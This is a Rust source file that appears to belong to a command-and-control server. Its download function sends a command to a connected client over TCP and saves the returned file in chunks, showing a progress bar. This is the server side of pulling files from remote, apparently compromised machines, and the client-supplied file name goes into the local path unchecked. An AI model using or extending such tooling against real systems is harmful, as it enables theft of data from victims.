use shared::{ClientMessage, FILE_CHUNK_SIZE, FileHeader, utils::read_message};
use crate::{c2_state::C2State, constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW}};
use std::{fs, io::{Read, Write}, net::TcpStream};


fn print_progress_bar(read_bytes: u64, total_bytes: u64) {
    let percent = if total_bytes == 0 {
        100.0
    } else {
        (read_bytes as f64 / total_bytes as f64) * 100.0
    };

    print!(
        "\r\t{DIM}[{RESET}{GREEN}download{RESET}{DIM}]{RESET} \
         {CYAN}{:.2}%{RESET} {DIM}({}/{}){RESET}",
        percent,
        read_bytes,
        total_bytes
    );

    std::io::stdout().flush().ok();
}


pub fn download(instruct: &[&str], conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    conn.write_all(instruct.join(" ").as_bytes()).map_err(|e| e.to_string())?;

    // Recive file size (or error)
    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;

    let fileheader: FileHeader = match msg {
        ClientMessage::FileDownload(header) => header,
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Ok(false);
        }
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}unknown error{RESET}\n");
            return Ok(false);
        }
    };

    println!("\n\t{DIM}[{RESET}{GREEN}download{RESET}{DIM}]{RESET} {WHITE}{}{RESET} {DIM}({} bytes){RESET}\n", fileheader.name, fileheader.size);

    let mut buf = [0u8; FILE_CHUNK_SIZE];
    let mut read_bytes: u64 = 0;
    let mut last_printed: u64 = 0;
    
    let path = format!("{}/{}", state.get_active_path(), &fileheader.name);
    let mut output = fs::File::create(path).map_err(|e| e.to_string())?;

    while read_bytes < fileheader.size {
        let bytes_read = match conn.read(&mut buf) {
            Ok(0) => { 
                println!("\n\t{DIM}[{RESET}{RED}err:conn{RESET}{DIM}]{RESET} {YELLOW}client close conn{RESET}\n");
                return Err("Client close connection".to_string());
            }

            Ok(b) => b,
            Err(err) => { return Err(err.to_string()) }
        };

        output.write_all(&buf[..bytes_read]).map_err(|e| e.to_string())?;
        read_bytes += bytes_read as u64;

        if read_bytes - last_printed >= 256 * 1024 {
            print_progress_bar(read_bytes, fileheader.size);
            last_printed = read_bytes;
        }
    };

    Ok(true)
}